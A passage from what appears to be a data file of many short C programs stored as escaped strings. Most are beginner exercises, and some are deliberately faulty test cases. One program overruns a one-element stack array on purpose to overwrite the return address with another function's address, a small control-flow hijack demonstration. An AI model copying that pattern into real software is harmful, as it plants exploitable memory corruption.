nprobs, c, p, hi, hf, k, h;\n  scanf(\"%d%d%d%d%d\",&ngrupo,&origem,&destino,&hi,&hf);\n  hi = (hi-7)*60;\n  hf = (hf-7)*60;\n  ler_matriz();\n  scanf(\"%d%d\",&k,&h);\n  c = 0;\n  while (k != 0) {\n    nprobs = analisa_rota(origem,destino,ngrupo,hi,hf,k,(h-7)*60);\n    if (nprobs != -1) {\n      if (c == 0 || nprobs < p) {\n c = 1; p = nprobs;\n      } else if (nprobs == p) c++;\n    }\n    scanf(\"%d%d\",&k,&h);\n  }\n  if (c == 0) printf(\"Impossivel\\n\");\n  else\n    printf(\"%d %d\\n\",c,p);\n  return 0;\n}",
    "#include <stdio.h>\nint squares(int lower, int upper);\nint main(void)\n{\n    int lower, upper;\n    _Bool input_is_fine;\n    printf(\"Enter lower and upper integer limits: \");\n    input_is_fine = (scanf(\"%d %d\", &lower, &upper) == 2);\n    while (input_is_fine)\n    {\n        printf(\"The sums of the squares from %d to %d is %d\\n\",\n                lower * lower, upper * upper, squares(lower, upper));\n        printf(\"Enter lower and upper integer limits: \");\n        input_is_fine = (scanf(\"%d %d\", &lower, &upper) == 2);\n    }\n    printf(\"Done\\n\");\n    return 0;\n}\nint squares(int lower, int upper)\n{\n    int sum = 0;\n    for ( ; lower <= upper; lower++)\n        sum = sum + lower * lower;\n    return sum;\n}",
    "#include <stdio.h>\nint iszhi(int a);\nint main()\n{\n int x;\n scanf(\"%d\",&x);\n for(int i=1;i<=100000;i++){\n  if(iszhi(x+i)==1)\n   {printf(\"%d\",(x+i));\n   break;}\n }\n return 0;\n}\nint iszhi(int a){\n  int n=0;\n for(int i=1;i<a;i++){\n  if(a%i==0)\n   n++;}\n if(n==1)\n return 1;\n else return 0;\n }",
    "#include <stdio.h>\n\nint main()\n{\n int a = 0;\n int b = 0;\n scanf(\"%d%d\",&a,&b);\n printf(\"max(%d,%d) = %d\\n\",a,b,a > b ? a : b);\n return 0;\n}",
    "#include <pthread.h>\n#include <stdio.h>\npthread_t thread_1;\npthread_t thread_2;\nint i = 0;\nvoid *inc() {\n for (int j=0; j<1000000; j++) {\n  i += 1;\n }\n}\nvoid *dec() {\n for (int j=0; j<1000000; j++) {\n  i -= 1;\n }\n}\nint main() {\n pthread_create(&thread_1, ((void*)0), inc, ((void*)0));\n pthread_create(&thread_2, ((void*)0), dec, ((void*)0));\n pthread_join(thread_1, ((void*)0));\n pthread_join(thread_2, ((void*)0));\n printf(\"Final value: %d\\n\", i);\n return 0;\n}",
    "#include<stdio.h>\n#include<math.h>\nint main()\n{\n int num,s=0,digit,copy;\n printf(\"Enter the number: \");\n scanf(\"%d\",&num);\n copy=num;\n while(num!=0)\n {\n  digit=num%10;\n  s+=pow(digit,3);\n  num=num/10;\n }\n if(s==copy)\n printf(\"%d is a Armstrong number\",copy);\n else\n printf(\"%d is not a Armstrong number\",copy);\n return 0;\n}",
    "#include <stdio.h>\nint main() {\n    char arr_nomes[4][20];\n    float salario[4], novosalario[4];\n    int i;\n    for(i = 0; i < 4; i++) {\n        printf(\"\\nnome: \");\n        scanf(\"%s\", &arr_nomes[i]);\n        printf(\"salario: \");\n        scanf(\"%f\", &salario[i]);\n    }\n    for(i = 0; i < 4; i++) {\n        novosalario[i] = salario[i] * 1.15;\n    }\n    printf(\"nome - salario\\n\");\n    for(i = 0; i < 4; i++) {\n        printf(\"%s - \", arr_nomes[i]);\n        printf(\"R$%.2f\\n\", novosalario[i]);\n    }\n    return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n    int h1,m1,h2,m2,h,m,total,hour;\n    while(scanf(\"%d %d %d %d\",&h1,&m1,&h2,&m2)==4)\n    {\n        if(h1==0 && h2==0 && m1==0 && m2==0)\n            break;\n        if(h1==0)\n        {\n            h1 = 24;\n        }\n        if(h2==0)\n        {\n            h2 = 24;\n        }\n        total = 24 * 60;\n        if(h2>h1)\n        {\n            h = (h2-h1) * 60;\n            if(m1<=m2)\n            {\n                m = m2 - m1;\n                hour = h + m;\n            }\n            else\n            {\n                m = m1 - m2;\n                hour = h - m;\n            }\n        }\n        else if(h2==h1)\n        {\n            if(m2>=m1)\n            {\n                m = m2 - m1;\n                hour = m;\n            }\n            else\n            {\n                m = m1 - m2;\n                hour = total - m;\n            }\n        }\n        else\n        {\n            h = (24-(h1 - h2)) * 60;\n            if(m2>=m1)\n            {\n                m = m2 - m1;\n                hour = h + m;\n            }\n            else\n            {\n                m = m1 - m2;\n                hour = h - m;\n            }\n        }\n        printf(\"%d\\n\", hour);\n    }\n}",
    "#include<stdio.h>\n#include<stdlib.h>\n#include<string.h>\nint check_vowel(char ch){\n if(ch==65||ch==69||ch==73||ch==79||ch==85||ch==89||\n   ch==97||ch==101||ch==105||ch==111||ch==117||ch==121){\n return 0;\n }else{\n  return 1;\n }\n}\nint main(void){\n int i,count,vowel_value;\n char arr[100];\n char copy[256];\n scanf(\"%s\",arr);\n copy[0]='.';\n count=0;\n for(i=0;i<strlen(arr);i++){\n vowel_value = check_vowel(arr[i]);\n if(copy[count]!=46&&vowel_value==0){\n }\n if(vowel_value==1&&arr[i]<=90&&arr[i]>=65){\n  count++;\n  copy[count]=arr[i]+32;\n  count++;\n  copy[count]='.';\n }\n if(vowel_value==1&&arr[i]>=97&&arr[i]<=122){\n  count++;\n  copy[count]=arr[i];\n  count++;\n  copy[count]='.';\n }\n }\n for(i=0;i<count;i++){\n printf(\"%c\",copy[i]);\n }\n return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main(int argc, char** argv) {\n return (0);\n}",
    "#include <stdio.h>\n#include <math.h>\nint fib(int n)\n{\n    return (pow((1.0+sqrt(5))/2, (double)n) - pow((1.0-sqrt(5))/2, (double)n))/sqrt(5) + 1e-9;\n}\nint main()\n{\n    int n;\n    scanf(\"%d\", &n);\n    printf(\"%d\\n\", fib(n));\n}",
    "int main() {\n    return -(5 * 6 + 8 / 4 * 5 - 2) * 3;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main(int argc, char *argv[])\n{\n int ch;\n FILE* fp;\n unsigned long count = 0;\n if (argc != 2)\n {\n  printf(\"Usage: %s filename\\n\", argv[0]);\n  exit(1);\n }\n if ((fp = fopen(argv[1], \"r\")) == ((void*)0))\n {\n  printf(\"Can't open %s\\n\", argv[1]);\n  exit(1);\n }\n while ((ch = getc(fp)) != (-1))\n {\n  putc(ch, (stdout));\n  count++;\n }\n fclose(fp);\n printf(\"FILE %s has %lu characters\\n\", argv[1], count);\n return 0;\n}",
    "int main() {\nint i=0, *p, *q;\np = &i;\nq = p;\nreturn 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <math.h>\nvoid helptext(char* p_name)\n{\n   printf(\"Usage: %s -a <amount> -i <interest rate> -d <duration> [ -c number of times a year to capitalize] \\n\", p_name);\n}\nint main(int argc, char** argv)\n{\n   double principle=0;\n   double amount;\n   int duration=0;\n   double interest_rate=0;\n   int capitalize=1;\n   if ( argc < 6 ) {\n      helptext(argv[0]);\n      exit(-1);\n   }\n   int i=1;\n   while (i < argc ) {\n      if ( strcmp(argv[i], \"-a\")==0 ) {\n         i++;\n         principle=atof(argv[i]);\n      }\n      if ( strcmp(argv[i], \"-i\")==0 ) {\n         i++;\n         interest_rate=atof(argv[i]);\n      }\n      if ( strcmp(argv[i], \"-d\")==0 ) {\n         i++;\n         duration=atoi(argv[i]);\n      }\n      if ( strcmp(argv[i], \"-c\")==0 ) {\n         i++;\n         capitalize=atoi(argv[i]);\n      }\n      i++;\n   }\n   if ( principle == 0 || interest_rate == 0 || duration == 0 ) {\n      helptext(argv[0]);\n      exit(-1);\n   }\n   printf(\"Principle=\u00a3%.2f\\nInterest=%5.2f%%\\nDuration=%d years\\n\", principle, interest_rate, duration);\n   if ( capitalize > 1 ) printf(\"Capitialized %d times a year\\n\", capitalize);\n   amount=principle * ( pow( 1 + ( (interest_rate/100) / capitalize ), (capitalize * duration) ) );\n   printf(\"After %d years your investment will be worth \u00a3%.2f\\n\", duration, amount);\n   exit(0);\n}",
    "#include <stdio.h>\nint main()\n{\n    int *ptrA;\n    float *ptrB;\n    ptrA = (int *)1000;\n    ptrB = (float *)2000;\n    if(ptrB > ptrA)\n       printf(\"PtrB is greater than ptrA\");\n    return(0);\n}",
    "#include <stdio.h>\nint tamanho(char s[])\n{\n int i;\n for (i=0; s[i];i++);\n return(i);\n}\nint main(int npar, char *pars[])\n{\n int i;\n printf (\"Recebi %d parametros\\n\", npar);\n for (i=1; i<npar; i++){\n  printf(\"[%d] %d cars = %s\\n\", i, tamanho(pars[i]));\n }\n return(0);\n}",
    "#include <sys/types.h>\n#include <unistd.h>\n#include <stdio.h>\n#include <stdlib.h>\nstatic int globalData = 0;\nvoid service(int processCount) {\n pid_t myPid;\n pid_t parentPid;\n myPid = getpid();\n parentPid = getppid();\n globalData++;\n printf(\"(%d)My pid is:%d\\n\",processCount,myPid);\n printf(\"(%d)Parent pid is:%d\\n\",processCount,parentPid);\n printf(\"(%d)Globaldata is currently:%d\\n\",processCount,globalData);\n sleep(8);\n myPid = getpid();\n parentPid = getppid();\n printf(\"(%d)After sleep my pid is:%d\\n\",processCount,myPid);\n printf(\"(%d)After sleep parent pid is:%d\\n\",processCount,parentPid);\n printf(\"(%d)After sleep globaldata is currently:%d\\n\",processCount,globalData);\n}\nint main(int argc, char **argv) {\n pid_t child;\n int i;\n for(i=0;i<10;i++) {\n  printf(\"main, globalData:%d\\n\",globalData);\n  child = fork();\n  printf(\"%d process, child value %d\\n\",getpid(),child);\n  if (child == 0) {\n   service(i);\n   exit(0);\n  } else if (child == -1) {\n   printf(\"Failed to fork child\\n\");\n   exit(1);\n  } else {\n   printf(\"Started process %d. Sleeping for 1 second\\n\",i);\n   sleep(1);\n  }\n }\n printf(\"Main ending here\\n\");\n}",
    "#include<stdio.h>\nint thirdAngle (int num1,int num2)\n{\n return 180 - (num1 + num2);\n}\nint main (void)\n{\n int num1,num2;\n printf(\"\\nEnter first angle: \");\n scanf(\"%d\",&num1);\n printf(\"\\nEnter second angle: \");\n scanf(\"%d\",&num2);\n if ((num1 > 0) && (num2>0))\n {\n  printf(\"\\nThe third angle is: %d \\n \\n\",thirdAngle(num1,num2));\n }\n else\n {\n  printf(\"\\nEnter valid value. \\n \\n\");\n }\n return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n    printf(\"hello, world\\n\");\n    return 1;\n}",
    "int f(int *p, int c) {\n int i;\n for (i = 0; i < c; i++) {\n  (*p)--;\n }\n return 1 / *p;\n}\nint main(void) {\n int a = 10;\n return f(&a, a);\n}",
    "#include <stdio.h>\n#include <string.h>\nint main () {\n   FILE *fp;\n   char buffer[100];\n   fp = fopen(\"/sys/kernel/binattr\", \"r\");\n   fread(buffer, 12, 1, fp);\n   printf(\"%s\\n\", buffer);\n   fclose(fp);\n   return(0);\n }",
    "#include <stdio.h>\n#include <unistd.h>\n#include <stdlib.h>\nint main(int argc, char *argv[]) {\n    pid_t pid;\n    printf(\"before fork,have enter\\n\");\n    printf(\"before fork,no enter:pid=%d\\t\", getpid());\n    pid = fork();\n    if (pid == 0) {\n        printf(\"\\nchild,after fork:pid=%d\\n\", getpid());\n    } else {\n        printf(\"\\nparent,after fork:pid=%d\\n\", getpid());\n    }\n}",
    "#include <ctype.h>\n#include <stdio.h>\nint atoi(const char *s) {\n  int n, sign;\n  while (__isspace(*s)) s++;\n  sign = (*s == '-') ? -1 : 1;\n  if (*s == '+' || *s == '-') s++;\n  for (n = 0; (0 ? isdigit(*s) : ((unsigned)(*s)-'0') < 10); s++) n = 10 * n + (*s - '0');\n  return sign * n;\n}\nint main(void) {\n  int a;\n  char *s = \"Helloworld\";\n  a = atoi(s);\n  printf(\"%d\", a);\n  return 0;\n}",
    "#include <stdint.h>\n#include <stdio.h>\nint main(int argc, char** argv) {\n  int y = -133;\n  int64_t x = ((int64_t)((short)(y))) * (100 + argc);\n  if (x > 0)\n    printf(\">0\\n\");\n  else\n    printf(\"<=0\\n\");\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n\nchar *alloc_word(char *word);\nchar getword(char *word, int max_size);\nint is_letter(char letter);\nvoid swap(char **src, char **dst);\nvoid reverse(char **src, int items);\nint main() {\n    char c_word[50], *words[100], c;\n    int index = 0;\n    printf(\"Ingresa una frase para invertirla:\\n\");\n    while ((c = getword(c_word, 50)) != '\\n')\n        if (is_letter(c))\n            words[index++] = alloc_word(c_word);\n    reverse(words, index);\n    printf(\"\\nFrase invertida:\\n\");\n    for (int i = 0; i < index; i++)\n        printf(\"%s%c\", words[i], (i == index - 1) ? '\\n': ' ');\n    return 0;\n}\nchar getword(char *word, int max_size) {\n    char c;\n    while ((c = getchar()) == ' ' || c == '\\t');\n    if (!(is_letter(c)))\n        return c;\n    else\n        ungetc(c, (stdin));\n    while ((c = getchar()) != (-1) && is_letter(c) && max_size-- != 1)\n        if (is_letter(c))\n            *word++ = c;\n    ungetc(c, (stdin));\n    *word = '\\0';\n    return *(word - 1);\n}\nchar *alloc_word(char *word) {\n    char *new_pos = (char *) malloc(strlen(word) + 1);\n    strcpy(new_pos, word);\n    return new_pos;\n}\nint is_letter(char letter) {\n    return (letter >= 'a' && letter <= 'z') || (letter >= 'A' && letter <= 'Z');\n}\nvoid swap(char **src, char **dst) {\n    char *tmp;\n    tmp = *src;\n    *src = *dst;\n    *dst = tmp;\n}\nvoid reverse(char **src, int items) {\n    char **end = src + items - 1;\n    for (int i = 0; i < (items / 2); i++, src++, end--)\n        swap(src, end);\n}",
    "#include <stdio.h>\n#include <string.h>\nchar strA[101];\nchar stack[2][101];\nint main(int argc, char* argv[])\n{\n    int i, k;\n freopen(\"input.txt\", \"r\", (stdin));\n    while (scanf(\"%s\", strA) != (-1)) {\n        for (i =k= 0; strA[i]; i++) {\n            if (strA[i] == '(') {\n                stack[0][k] = 1;\n                stack[1][k++] = i;\n            }\n            if (strA[i] == ')') {\n                if (stack[0][k-1]==1) {\n                    k--;\n                }else {\n                    stack[0][k] = 2;\n                    stack[1][k++] = i;\n                }\n            }\n        }\n        printf(\"%s\\n\", strA);\n        memset(strA, ' ', strlen(strA));\n        for (i = 0; i < k; i++) {\n           strA[stack[1][i]] = (stack[0][i]==1)?'$':'?';\n        }\n        printf(\"%s\\n\", strA);\n    }\n return 0;\n}",
    "#include <stdio.h>\nvoid my_scanf(char *str, int *ret) {\n    int num = 0, flag = 0;\n    if (str[0] == '-') {\n        str += 1;\n        flag = 1;\n    }\n    for (int i = 0; str[i]; i++) {\n        num = num * 10 + (str[i] - '0');\n    }\n    if (flag == 1) {\n        num = -num;\n    }\n    *ret = num;\n    return ;\n}\nint main() {\n    char str[1000];\n    int n = 65;\n    scanf(\"%s\", str);\n    my_scanf(str, &n);\n    printf(\"n = %d\\n\", n);\n    return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n  int votes[6]={0},i,n,max=votes[0],pos;\n  char ch;\n  printf(\"Enter no. of voters:\");\n  scanf(\"%d\",&n);\n  for(i=1;i<=n;i++)\n  {\n    printf(\"Voter%d\\n\",i);\n    printf(\"Cast your vote(A/B/C/D/E/NOTA):\");\n    scanf(\" %c\",&ch);\n    switch(ch)\n    {\n      case 'A':votes[0]++;\n               break;\n      case 'B':votes[1]++;\n               break;\n      case 'C':votes[2]++;\n               break;\n      case 'D':votes[3]++;\n               break;\n      case 'E':votes[4]++;\n               break;\n      default:votes[5]++;\n    }\n  }\n  for(i=0;i<5;i++)\n  {\n    if(votes[i]>max)\n    {\n      max=votes[i];pos=i;\n    }\n  }\n  if(pos==0)\n  {\n    printf(\"Winner-Candidate A\\n\");\n  }\n  else if(pos==1)\n  {\n    printf(\"Winner-Candidate B\\n\");\n  }\n  else if(pos==2)\n  {\n    printf(\"Winner-Candidate C\\n\");\n  }\n  else if(pos==3)\n  {\n    printf(\"Winner-Candidate D\\n\");\n  }\n  else if(pos==4)\n  {\n    printf(\"Winner-Candidate E\\n\");\n  }\n  printf(\"No. of spare votes-%d\",votes[5]);\n  return 0;\n}",
    "#include<stdio.h>\nint main(int argc, char const *argv[])\n{\n int n, m;\n scanf(\"%d %d\", &n, &m);\n while(n<=m){\n  (n % 2)==0 ? : printf(\"%d\\n\", n);\n  ++n;\n }\n return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n    int numeros [5];\n    numeros[0] = 1;\n    numeros[1] = 3;\n    numeros[2] = 5;\n    numeros[3] = 7;\n    numeros[4] = 9;\n    float valores [5];\n    for (int i = 0; i < 5; i++)\n    {\n        valores[i] = (float)numeros[i] / (float)2;\n    }\n    for (int i = 4; i >= 0; i-- )\n    {\n        printf(\"%.2f\\n\", valores[i]);\n    }\n    return 0;\n}",
    "#include <unistd.h>\n#include <stdio.h>\nint main()\n{\n int counter;\n alarm(1);\n for (counter=0; 1; counter++)\n  printf(\"counter=%d\\n\", counter);\n return 0;\n}",
    "#include <stdio.h>\n#include <string.h>\nint main(void)\n{\n int nSt, nEx, total;\n float avg = 0;\n printf(\"Enter the no of students: \");\n scanf(\"%d\", &nSt);\n printf(\"Enter the no of exams: \");\n scanf(\"%d\", &nEx);\n int score[nSt][nEx];\n for (int i = 0; i < nSt; i++)\n {\n  printf(\"Student %d\\n\", i + 1);\n  for (int j = 0; j < nEx; j++)\n  {\n   printf(\"Enter score %d: \", j + 1);\n   scanf(\"%d\", &score[i][j]);\n  }\n }\n printf(\"Student\\tExam Scores\\t Average\\n\");\n for (int i = 0; i < nSt; i++)\n {\n  printf(\"%d\\t\", i + 1);\n  total = 0;\n  for (int j = 0; j < nEx; j++)\n  {\n   total += score[i][j];\n   printf(\"%d\\t\", score[i][j]);\n  }\n  avg = total / nEx;\n  printf(\"%.2f\\n\", avg);\n }\n return 0;\n}",
    "#include <stdio.h>\nint DigitFrequency(int iNo, int i)\n{\n    int iDigit = 0, iCnt = 0;\n    if(iNo < 0)\n    {\n        iNo =- iNo;\n    }\n    if((i < 0) || (i > 9))\n    {\n        printf(\"Invalid Digits\\n\");\n        return 0;\n    }\n    while(iNo > 0)\n    {\n        iDigit = iNo % 10;\n        if(iDigit == i)\n        {\n            iCnt++;\n        }\n        iNo = iNo / 10;\n    }\n    return iCnt;\n}\nint main()\n{\n    int ivalue1 = 0, ivalue2 = 0, iRet = 0;\n    printf(\"Enter Number : \");\n    scanf(\"%d\", &ivalue1);\n    printf(\"Enter the digit that you want to search \");\n    scanf(\"%d\", &ivalue2);\n    iRet = DigitFrequency(ivalue1, ivalue2);\n    printf(\"Number of given digits are  : %d \", iRet);\n    return 0;\n}",
    "int main()\n{\n     return 0;\n}",
    "#include <stdio.h>\nint funcao(int V[], int N, int k){\n if (N == 0)\n {\n  return -1;\n }\n if (V[N-1]==k)\n {\n  return N-1;\n }\n return funcao(V,N-1,k);\n}\nint main(void)\n{\n int N=5,V[N],k=5,r;\n V[0]=5,V[1]=4,V[2]=3,V[3]=6,V[4]=1;\n r=funcao(V,N,k);\n printf(\"%d\\n\",r);\n return 0;\n}",
    "int main(void)\n{\nint a;\na = 1 / 1;\nreturn 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main(int argc, char *argv[]){\n    system(\"clear\");\n    if( argc == 2 ) {\n        printf(\"Satu parameter yang dimasukan: %s\\n\", argv[1]);\n    }\n    else if( argc > 2 ) {\n        printf(\"Banyak parameter yang Anda masukan.\\n\");\n    }\n    else {\n        printf(\"Tidak ada parameter yang dimasukan.\\n\");\n    }\n    return 0;\n}",
    "#include <stdio.h>\nint main(){\n    int num1, num2, num3;\n    num1 = 10;\n    num2 = 455;\n    num3 = -48;\n    printf(\"Valor de num1: %d\\n\", num1);\n    printf(\"Valor de num2: %d\\n\", num2);\n    printf(\"Valor de num3: %d\\n\", num3);\n    printf(\"\\n\\n\");\n    return 0;\n}",
    "#include <stdio.h>\nint main() {\n  int a = 10;\n  printf(\"%d\\n\", a);\n  a += 10;\n  printf(\"%d\\n\", a);\n  a -= 10;\n  printf(\"%d\\n\", a);\n  a *= 10;\n  printf(\"%d\\n\", a);\n  a /= 10;\n  printf(\"%d\\n\", a);\n  a %= 10;\n  printf(\"%d\\n\", a);\n  return 0;\n}",
    "#include <stdio.h>\nint main() {\n    int peca1, numero1, peca2, numero2;\n    float valor1, valor2, total;\n    scanf(\"%i %i %f\", &peca1, &numero1, &valor1);\n    scanf(\"%i %i %f\", &peca2, &numero2, &valor2);\n    total = (numero1 * valor1) + (numero2 * valor2);\n    printf(\"VALOR A PAGAR: R$ %.2f\\n\", total);\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main()\n{\n    void move(int *pointer);\n    int a[3][3],*p,i;\n    printf(\"input the matrix:\\n\");\n    for(i = 0;i<3;i++)\n    {\n        scanf(\"%d %d %d\",&a[i][0],&a[i][1],&a[i][2]);\n    }\n    p = &a[0][0];\n    move(p);\n    printf(\"Now,matrix:\\n\");\n    for(i = 0;i<3;i++)\n    {\n        printf(\"%d %d %d\\n\",a[i][0],a[i][1],a[i][2]);\n    }\n    return 0;\n}\nvoid move(int *p)\n{\n    int i,j,t;\n    for(i = 0;i<3;i++)\n    {\n        for(j = 0;j<i;j++)\n        {\n            t = *(p+i*3+j);\n            *(p+i*3+j) = *(p+j*3+i);\n            *(p+j*3+i) = t;\n        }\n    }\n}",
    "#include <stdio.h>\nint main(void) {\n    printf(\"Welcome to C!\\n\");\n    return 0;\n}",
    "#include <stdio.h>\nint add_i(int a , int b);\nint main(void) {\n int x = 10, y = 20, z;\n z = add_i(x, y);\n printf(\"%d + %d = %d\\n\", x, y, z);\n return 0;\n}\nint add_i(int a, int b) {\n int c;\n  c = a + b;\n return c;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nvoid where(void)\n{\n printf(\"why are u here!\\n\");\n return;\n}\nvoid f()\n{\n int repl[1];\n repl[0] = 1;\n repl[1] = 2;\n repl[2] = 3;\n repl[3] = (int)where;\n}\nint main(void)\n{\n f();\n return 0;\n}",
    "#include <stdarg.h>\n#include <stdio.h>\n#include <string.h>\n#include <math.h>\ndouble vproduct( int n, va_list argptr );\ndouble vsum( int n, va_list argptr );\ndouble vop( const char * op, int argcount, ... );\nint main()\n{\n    double d1, d2, d3, d4, d5, d6;\n    puts( \"Enter six floating-point numbers, please:\" );\n    scanf( \"%lf%lf%lf%lf%lf%lf\", &d1, &d2, &d3, &d4, &d5, &d6 );\n    char *operation[] = {\"sum\", \"product\", \"product minus the sum\",((void*)0)};\n    printf(\"\\nUsing the three numbers %lf, %lf, and %lf.\\n\", d1, d2, d3);\n    for ( int i = 0; operation[i] != ((void*)0); i++ )\n    {\n        printf( \"The %s of these %d numbers is %lf\\n\",\n                 operation[i], 3, vop( operation[i], 3, d1, d2, d3 ) );\n    }\n    printf( \"\\nUsing six numbers:\"\n            \"\\n\\t%lf \\t%lf \\t%lf \\n\\t%lf \\t%lf \\t%lf\\n\",\n            d1, d2, d3, d4, d5, d6 );\n    for ( int i = 0; operation[i] != ((void*)0); i++ )\n    {\n        printf( \"The %s of these %d numbers is %lf\\n\",\n                operation[i], 6,\n                vop( operation[i], 6, d1, d2, d3, d4, d5, d6 ) );\n    }\n}\ndouble vop( const char * op, int argcount, ... )\n{\n    va_list argptr;\n    double result;\n    __builtin_va_start(argptr, argcount);\n    if ( strcmp( op, \"sum\" ) == 0 )\n       result = vsum( argcount, argptr );\n    else if ( strcmp( op, \"product\" ) == 0 )\n       result = vproduct( argcount, argptr );\n    else if ( strcmp( op, \"product minus the sum\" ) == 0 )\n    {\n       va_list duplicate_argptr;\n       __builtin_va_copy(duplicate_argptr, argptr);\n       result = vproduct( argcount, argptr )\n                - vsum( argcount, duplicate_argptr );\n       __builtin_va_end(duplicate_argptr);\n    }\n    else result = __builtin_nanf(\"\");\n    __builtin_va_end(argptr);\n    return result;\n}\ndouble vproduct( int n, va_list argptr )\n{\n    double product = 1.0;\n    for ( int i = 0; i < n; i ++ )\n        product *= __builtin_va_arg(argptr, double);\n    return product;\n}\ndouble vsum( int n, va_list argptr )\n{\n    double sum = 0.0;\n    for ( int i = 0; i < n; i ++ )\n        sum += __builtin_va_arg(argptr, double);\n    return sum;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\nstatic const char *crabRave = \"c'est pas le quartier qui me quitte\"\n                              \", c'est moi j'quitte le quartier\";\nstatic size_t partyHard(const char *s1, const char *s2) {\n  while (*s1 == *s2) {\n    if (*s1 == '\\0') return 0;\n    ++s1; ++s2;\n  }\n  return *s1 - *s2;\n}\nint main(int argc, const char *const argv[]) {\n  if (argc < 2) {\n    printf(\"Il faut un argument...\\n\");\n    return 1;\n  }\n  ++argv;\n  if (partyHard(crabRave + 37, *argv) == 0) {\n    printf(\"C'est correct !\\n\");\n    return 1;\n  }\n  printf(\"Ce n'est pas correct...\\n\");\n  return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main(){\n  char** v;\n  int n = 10;\n  int i;\n  v = malloc(sizeof(char*)*n);\n  for(i=0;i<n;i++){\n    v[i] = malloc(sizeof(char)*30);\n    scanf(\"%s\",v[i]);\n  }\n  for(i=0;i<n;i++){\n    printf(\"V[%d] = %s\\n\",i,v[i]);\n  }\n  return 0;\n}",
    "#include<stdio.h>\nint main(){\n    int i = 0;\n    int j = 0;\n    for(i = 20; i > 0; i--){\n        printf(\"\\n\");\n        for(j = 20; j > i; j--){\n            printf(\"*\");\n        }\n    }\n    printf(\"\\n\");\n    return 0;\n}",
    "#include <stdio.h>\nvoid mergeSort(int array[], int begin, int end)\n{\n  int i, j, k, meio, aux[end + 1];\n  if (begin == end)\n  {\n    return;\n  }\n  meio = (begin + end) / 2;\n  mergeSort(array, begin, meio);\n  mergeSort(array, meio + 1, end);\n  i = begin;\n  j = meio + 1;\n  k = 0;\n  while (i < meio + 1 || j < end + 1)\n  {\n    if (i == meio + 1)\n    {\n      aux[k] = array[j];\n      j ++;\n      k ++;\n    }\n    else\n    {\n      if (j == end + 1)\n      {\n        aux[k] = array[i];\n        i ++;\n        k ++;\n      }\n      else\n      {\n        if (array[i] < array[j])\n        {\n          aux[k] = array[i];\n          i ++;\n          k ++;\n        }\n        else\n        {\n          aux[k] = array[j];\n          j ++;\n          k ++;\n        }\n      }\n    }\n  }\n  for (i = begin; i <= end; i ++)\n  {\n    array[i] = aux[i - begin];\n  }\n}\nint main()\n{\n  int a[10] = {9, 2, 3, 5, 4, 6, 1, 8, 7, 10};\n  mergeSort(a, 0, 9);\n  int i;\n  for (i = 0; i < 10; i ++)\n  {\n    printf(\"%d \", a[i]);\n  }\n  printf(\"\\n\");\n  return(0);\n}",
    "#include <stdlib.h>\n#include <stdio.h>\n#include <malloc.h>\n#include <math.h>\n\nint sum(int n)\n{\n    while (n >= 10)\n    {\n        int m = 0;\n        while (n)\n        {\n            m += n % 10;\n            n /= 10;\n        }\n        n = m;\n    }\n    return n;\n}\nint main()\n{\n    int n = 999999;\n    int *dp = malloc(sizeof(int) * (n + 1));\n    int ans = 0;\n    for (int i = 2; i <= n; i++)\n    {\n        dp[i] = sum(i);\n        for (int j = 2; j <= (int)sqrt(i); j++)\n        {\n            if (i % j == 0)\n            {\n                dp[i] = (((dp[i]) > (dp[j] + dp[i / j])) ? (dp[i]) : (dp[j] + dp[i / j]));\n            }\n        }\n        ans += dp[i];\n    }\n    printf(\"%d\", ans);\n    free(dp);\n    return 0;\n}",
    "#include <stdio.h>\nint main(void)\n{\n    float x;\n    float calulated_value;\n    printf(\"enter a x: \");\n    scanf(\"%f\", &x);\n    calulated_value = ((((3 * x + 2) * x - 5 ) * x - 1) * x + 7) * x - 6;\n    printf(\"result of 3 * %.2f^5 + 2 * %.2f^4 - 5 * %.2f^3 - %.2f^2 + 7 * %.2f\"\n           \" - 6 = %.2f\\n\",\n           x, x, x, x, x, calulated_value);\n    return 0;\n}",
    "int main() {}",
    "#include <stdio.h>\n\nint MAX_SIZE=0;\nint list[50];\nstatic void insert(int pos, int v){\n int i = MAX_SIZE - 1;\n if(pos >= MAX_SIZE || pos < 0){\n  printf(\"Invalid position!\\n\");\n  return;\n }\n while(i > pos){\n  list[i] = list[i-1];\n  --i;\n }\n list[pos] = v;\n}\nstatic int search(int *pos, int v){\n int i = 0;\n while(i<MAX_SIZE){\n  if(list[i++] == v){\n   *pos = i-1;\n   return 0;\n  }\n }\n return -1;\n}\nstatic void delete(int pos){\n int i = pos;\n if(pos >= MAX_SIZE || pos < 0){\n  printf(\"Invalid position!\\n\");\n  return;\n }\n while(i < MAX_SIZE-1){\n  list[i] = list[i+1];\n  ++i;\n }\n}\nstatic void display(){\n int i = 0;\n while(i<MAX_SIZE)\n  printf(\"%d\\n\", list[i++]);\n}\nint main(){\n int opt = 0,buf1 = 0, buf2 = 0;\n printf(\"Enter the maximum size of list: \");\n scanf(\"%d\", &MAX_SIZE);\n if(MAX_SIZE >= 50){\n  printf(\"not enough memory!\\n\");\n  return -1;\n }\n while(opt!=5){\n  printf(\"\\n\\n::LIST OPERATIONS::\\n\");\n  printf(\"1. Insert.\\n2. Search.\\n3. Delete.\\n4. Display.\\n5. Exit.\\n\");\n  printf(\"Enter your choice: \");\n  scanf(\"%d\", &opt);\n  switch(opt){\n   case 1:\n    printf(\"Enter the position to insert: \");\n    scanf(\"%d\", &buf1);\n    printf(\"Enter the value to insert: \");\n    scanf(\"%d\", &buf2);\n    insert(buf1,buf2);\n    break;\n   case 2:\n    printf(\"Enter the value to search: \");\n    scanf(\"%d\", &buf1);\n    if(!search(&buf2, buf1))\n     printf(\"Value found at position: %d\\n\", buf2);\n    else\n     printf(\"Value not found!\\n\");\n    break;\n   case 3:\n    printf(\"Enter the position to delete: \");\n    scanf(\"%d\", 